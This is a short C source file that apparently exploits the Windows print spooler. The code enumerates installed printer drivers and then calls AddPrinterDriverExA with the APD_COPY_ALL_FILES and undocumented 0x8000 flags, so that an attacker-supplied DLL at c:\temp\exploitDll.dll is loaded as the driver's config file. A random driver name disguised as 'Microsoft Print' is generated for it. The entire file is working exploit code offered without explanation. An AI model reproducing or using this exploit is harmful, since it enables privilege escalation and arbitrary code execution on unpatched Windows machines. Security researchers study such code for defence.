#include <windows.h>
#include <stdio.h>


#define DRIVER_INFO_LEVEL_2		2
#define DRIVER_NAME_SIZE		30


VOID GenRandDriverName(char* drivername){
	char charset[] = "abcdefghijklmnopqrstuvwxyz";
	const char prefix[] = "Microsoft Print ";

	strcpy_s(drivername, DRIVER_NAME_SIZE, prefix);
	for (UINT i = sizeof(prefix)-1; i < DRIVER_NAME_SIZE; i++){
		UINT key = rand() % (UINT)(sizeof(charset) - 1);
		drivername[i] = charset[key];
	}
	return;
}
VOID CreateDriverInfo(char* dllPath, DRIVER_INFO_2A *pInfo){
	// https://docs.microsoft.com/en-us/windows/win32/printdocs/driver-info-2
	char driverName[DRIVER_NAME_SIZE +1];

	GenRandDriverName(driverName);
	pInfo->cVersion = 3;
	pInfo->pConfigFile = dllPath;
	pInfo->pDataFile = (char*)"C:\\Windows\\System32\\kernelbase.dll";
	pInfo->pDriverPath = NULL;
	pInfo->pEnvironment = NULL;
	pInfo->pName = driverName;
	printf("[i] Driver name: '%s'\n", driverName);
	return;
}

BOOL EnumPrinter(LPBYTE *pInfo){
	DWORD pcbNeeded;
	DWORD numDriversExist;
	EnumPrinterDriversA(NULL, NULL, 2, NULL, 0, &pcbNeeded, &numDriversExist);
	printf("[+] Drivers Count: %d\n", numDriversExist);

	*pInfo = (LPBYTE)malloc(pcbNeeded);
	if (*pInfo == NULL)
		return FALSE;

	//[Start find Printer Driver]
	if (!EnumPrinterDriversA(NULL, NULL, 2, *pInfo, pcbNeeded, &pcbNeeded, &numDriversExist)){
		printf("[-] Find Printer Driver ERR: %d\n", GetLastError());
		free(*pInfo);
		return FALSE;
	} else
		printf("[+] Finding Printer Driver ok.\n");
	return TRUE;
}

BOOL Exploit(char* dllPath){
	DRIVER_INFO_2A info;
	LPBYTE pInfo = NULL;

	CreateDriverInfo(dllPath , &info);
	if (EnumPrinter(&pInfo)){
		DRIVER_INFO_6A* foundInfo = (DRIVER_INFO_6A*)pInfo;
		info.pDriverPath = foundInfo->pDriverPath;	

		if (AddPrinterDriverExA(NULL, DRIVER_INFO_LEVEL_2, (PBYTE)&info, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | 0x8000)){
			printf("[+] New printer driver added\n");
			printf("[+] Done !!! All finished.\n");
			free(pInfo);
			return TRUE;
		} else{
			DWORD lastError = GetLastError();
			switch (lastError){
			case ERROR_PRINTER_DRIVER_BLOCKED:
				printf("[x] Error with AddPrinterDriverEx: PRINTER DRIVER BLOCKED \n");
				break;
			case ERROR_PRINTER_DRIVER_WARNED:
				printf("[x] Error with AddPrinterDriverEx: PRINTER DRIVER WARNED \n");
				break;
			default:
				printf("[x] Error with AddPrinterDriverEx: %lu\n", lastError);
				break;
			}
		}
		free(pInfo);
	}
	return FALSE;
}




int main(){


	Exploit("c:\\temp\\exploitDll.dll");

	return 0;
}